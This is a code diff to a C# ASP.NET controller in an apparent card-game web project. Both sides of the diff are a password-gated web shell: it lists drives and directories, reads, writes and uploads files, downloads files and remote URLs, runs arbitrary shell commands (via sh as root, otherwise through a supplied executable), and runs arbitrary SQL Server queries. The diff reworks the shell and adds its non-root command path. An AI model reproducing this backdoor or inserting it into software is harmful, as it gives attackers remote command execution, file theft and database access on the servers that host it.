@@ -23,43 +23,35 @@ namespace CardWarWEB.Controllers
 
         [Route("Post")]
         [HttpPost]
-        public string Post(string skzy0, string Z1, string Z2)
+        public void Post()
         {
-            string Z = skzy0;//密码
-            //Z = Request.ReadFormAsync().Result["skzy0"];
-            string R = "";
+            String Z = Request.Form["skzy0"];//密码
             if (Z != "")
             {
-                try
+                String Z1 = Request.Form["Z1"]; String Z2 = Request.Form["Z2"]; String R = ""; try
                 {
                     switch (Z)
                     {
                         case "A":
                             {
-                                ;
-                                string[] c = new string[] { Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()) }; R = string.Format("{0}\t", Server.MapPath("/")); for (int i = 0; i < c.Length; i++)
+                                String[] c = Directory.GetLogicalDrives(); R = String.Format("{0}\t", Server.MapPath("/")); for (int i = 0; i < c.Length; i++)
                                     R += c[i][0] + ":"; break;
                             }
                         case "B":
                             {
                                 DirectoryInfo m = new DirectoryInfo(Z1); foreach (DirectoryInfo D in m.GetDirectories())
-                                { R += string.Format("{0}/\t{1}\t0\t-\n", D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss")); }
+                                { R += String.Format("{0}/\t{1}\t0\t-\n", D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss")); }
                                 foreach (FileInfo D in m.GetFiles())
                                 {
-                                    R += string.Format("{0}\t{1}\t{2}\t-\n", D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"),
+                                    R += String.Format("{0}\t{1}\t{2}\t-\n", D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"),
 D.Length);
                                 }
                                 break;
                             }
-                        case "C":
-                            {
-                                FileStream fs = new FileStream(Z1, FileMode.Open, FileAccess.ReadWrite);
-                                StreamReader m = new StreamReader(fs); R = m.ReadToEnd(); fs.Close(); m.Close(); break;
-                            }
+                        case "C": { StreamReader m = new StreamReader(Z1, Encoding.Default); R = m.ReadToEnd(); m.Close(); break; }
                         case "D":
                             {
-                                FileStream fs = new FileStream(Z1, FileMode.Open, FileAccess.ReadWrite);
-                                StreamWriter m = new StreamWriter(fs); m.Write(Z2); R = "1"; fs.Close(); m.Close(); break;
+                                StreamWriter m = new StreamWriter(Z1, false, Encoding.Default); m.Write(Z2); R = "1"; m.Close(); break;
                             }
                         case "E":
                             {
@@ -69,19 +61,16 @@ D.Length);
                             }
                         case "F":
                             {
-                                FileStream fs = new FileStream(Z1, FileMode.Open, FileAccess.ReadWrite);
-                                byte[] datas = new byte[fs.Length];
-                                fs.Read(datas, 0, Convert.ToInt32(fs.Length));
-                                HttpContext.Response.Clear(); HttpContext.Response.WriteAsync("\x2D\x3E\x7C");
-                                HttpContext.Response.Body.Write(datas, 0, Convert.ToInt32(fs.Length));
-                                HttpContext.Response.WriteAsync("\x7C\x3C\x2D"); fs.Close(); goto End;
+                                Response.Clear(); Response.WriteAsync("\x2D\x3E\x7C");
+                                byte[] by = System.IO.File.ReadAllBytes(Z1);
+                                Response.Body.Write(by, 0, by.Length); Response.WriteAsync("\x7C\x3C\x2D"); goto End;
                             }
                         case "G":
                             {
                                 byte[] B = new byte[Z2.Length / 2];
                                 for (int i = 0; i < Z2.Length; i += 2) { B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16); }
                                 FileStream fs = new FileStream(Z1, FileMode.Create);
-                                fs.Write(B, 0, B.Length); R = "1"; fs.Close(); break;
+                                fs.Write(B, 0, B.Length); fs.Close(); R = "1"; break;
                             }
                         case "H": { CP(Z1, Z2); R = "1"; break; }
                         case "I":
@@ -105,66 +94,71 @@ D.Length);
                         case "L":
                             {
                                 HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1)); RQ.Method = "GET";
-                                RQ.ContentType = "application/x-www-form-urlencoded"; HttpWebResponse WB = (HttpWebResponse)RQ.GetResponseAsync().Result;
+                                RQ.ContentType = "application/x-www-form-urlencoded"; HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();
                                 Stream WF = WB.GetResponseStream(); FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write); int i; byte[] buffer = new byte[1024];
                                 while (true) { i = WF.Read(buffer, 0, buffer.Length); if (i < 1) break; FS.Write(buffer, 0, i); }
-                                R = "1"; WF.Close(); FS.Close();
+                                WF.Close(); WB.Close(); FS.Close(); R = "1";
                                 break;
                             }
                         case "M":
                             {
-
-                                Process p = new Process();
-                                p.StartInfo.FileName = "sh";
-                                p.StartInfo.UseShellExecute = false;
-                                p.StartInfo.RedirectStandardInput = true;
-                                p.StartInfo.RedirectStandardOutput = true;
-                                p.StartInfo.RedirectStandardError = true;
-                                p.StartInfo.CreateNoWindow = true;
-                                p.Start();
-                                p.StandardInput.WriteLine(Z2);
-                                p.StandardInput.WriteLine("exit");
-                                R = p.StandardOutput.ReadToEnd();
-                                p.Dispose();
-                                break;
+                                if (Environment.UserName == "root")
+                                {
+                                    Process p = new Process();
+                                    p.StartInfo.FileName = "sh";
+                                    p.StartInfo.UseShellExecute = false;
+                                    p.StartInfo.RedirectStandardInput = true;
+                                    p.StartInfo.RedirectStandardOutput = true;
+                                    p.StartInfo.RedirectStandardError = true;
+                                    p.StartInfo.CreateNoWindow = true;
+                                    p.Start();
+                                    p.StandardInput.WriteLine(Z2);
+                                    p.StandardInput.WriteLine("exit");
+                                    R = p.StandardOutput.ReadToEnd();
+                                    p.Dispose();
+                                    break;
+                                }
+                                ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2)); Process e = new Process(); StreamReader OT, ER;
+                                c.UseShellExecute = false; c.RedirectStandardOutput = true; c.RedirectStandardError = true; e.StartInfo = c;
+                                c.Arguments = String.Format("{0} {1}", Z1.Substring(0, 2), Z2); e.Start(); OT = e.StandardOutput; ER = e.StandardError; e.Close();
+                                R = OT.ReadToEnd() + ER.ReadToEnd(); break;
                             }
                         case "N":
                             {
-                                string strDat = Z1.ToUpper(); SqlConnection Conn = new SqlConnection(Z1);
+                                String strDat = Z1.ToUpper(); SqlConnection Conn = new SqlConnection(Z1);
                                 Conn.Open(); R = Conn.Database + "\t"; Conn.Close(); break;
                             }
                         case "O":
                             {
-                                string[] x = Z1.Replace("\r", "").Split('\n'); string strConn = x[0], strDb = x[1];
-                                SqlConnection Conn = new SqlConnection(strConn); Conn.Open();
-                                DataTable dt = Conn.GetSchema("Columns"); Conn.Close(); for (int i = 0; i < dt.Rows.Count; i++)
-                                { R += string.Format("{0}\t", dt.Rows[i][2].ToString()); }
+                                String[] x = Z1.Replace("\r", "").Split('\n'); String strConn = x[0], strDb = x[1];
+                                SqlConnection Conn = new SqlConnection(strConn); Conn.Open(); DataTable dt = Conn.GetSchema("Columns"); Conn.Close(); for (int i = 0; i < dt.Rows.Count; i++)
+                                { R += String.Format("{0}\t", dt.Rows[i][2].ToString()); }
                                 break;
                             }
                         case "P":
                             {
-                                string[] x = Z1.Replace("\r", "").Split('\n'), p = new string[4];
-                                string strConn = x[0], strDb = x[1], strTable = x[2]; p[0] = strDb; p[2] = strTable; SqlConnection Conn = new SqlConnection(strConn);
+                                String[] x = Z1.Replace("\r", "").Split('\n'), p = new String[4];
+                                String strConn = x[0], strDb = x[1], strTable = x[2]; p[0] = strDb; p[2] = strTable; SqlConnection Conn = new SqlConnection(strConn);
                                 Conn.Open(); DataTable dt = Conn.GetSchema("Columns", p); Conn.Close(); for (int i = 0; i < dt.Rows.Count; i++)
                                 {
-                                    R += string.Format("{0} ({1})\t", dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());
+                                    R += String.Format("{0} ({1})\t", dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());
                                 }
                                 break;
                             }
                         case "Q":
                             {
-                                string[] x = Z1.Replace("\r", "").Split('\n');
-                                string strDat, strConn = x[0], strDb = x[1]; int i, c; strDat = Z2.ToUpper(); SqlConnection Conn = new SqlConnection(strConn);
+                                String[] x = Z1.Replace("\r", "").Split('\n');
+                                String strDat, strConn = x[0], strDb = x[1]; int i, c; strDat = Z2.ToUpper(); SqlConnection Conn = new SqlConnection(strConn);
                                 Conn.Open(); if (strDat.IndexOf("SELECT ") == 0 || strDat.IndexOf("EXEC ") == 0 || strDat.IndexOf("DECLARE ") == 0)
                                 {
                                     SqlDataAdapter OD = new SqlDataAdapter(Z2, Conn); DataSet ds = new DataSet(); OD.Fill(ds); if (ds.Tables.Count > 0)
                                     {
                                         DataRowCollection rows = ds.Tables[0].Rows; for (c = 0; c < ds.Tables[0].Columns.Count; c++)
                                         {
-                                            R += string.Format("{0}\t|\t", ds.Tables[0].Columns[c].ColumnName.ToString());
+                                            R += String.Format("{0}\t|\t", ds.Tables[0].Columns[c].ColumnName.ToString());
                                         }
                                         R += "\r\n"; for (i = 0; i < rows.Count; i++)
-                                        { for (c = 0; c < ds.Tables[0].Columns.Count; c++) { R += string.Format("{0}\t|\t", rows[i][c].ToString()); } R += "\r\n"; }
+                                        { for (c = 0; c < ds.Tables[0].Columns.Count; c++) { R += String.Format("{0}\t|\t", rows[i][c].ToString()); } R += "\r\n"; }
                                     }
                                     ds.Clear(); ds.Dispose();
                                 }
@@ -172,19 +166,15 @@ D.Length);
                                     SqlCommand cm = Conn.CreateCommand(); cm.CommandText = Z2; cm.ExecuteNonQuery();
                                     R = "Result\t|\t\r\nExecute Successfully!\t|\t\r\n";
                                 }
-                                Conn.Close();
-                                break;
+                                Conn.Close(); break;
                             }
                         default: goto End;
                     }
                 }
                 catch (Exception E)
                 { R = "ERROR:// " + E.Message; }
-                return "\x2D\x3E\x7C" + R + "\x7C\x3C\x2D";
-                End:;
-
+                Response.WriteAsync("\x2D\x3E\x7C" + R + "\x7C\x3C\x2D"); End:;
             }
-            return "";
         }
 
         private void CP(String S, String D)
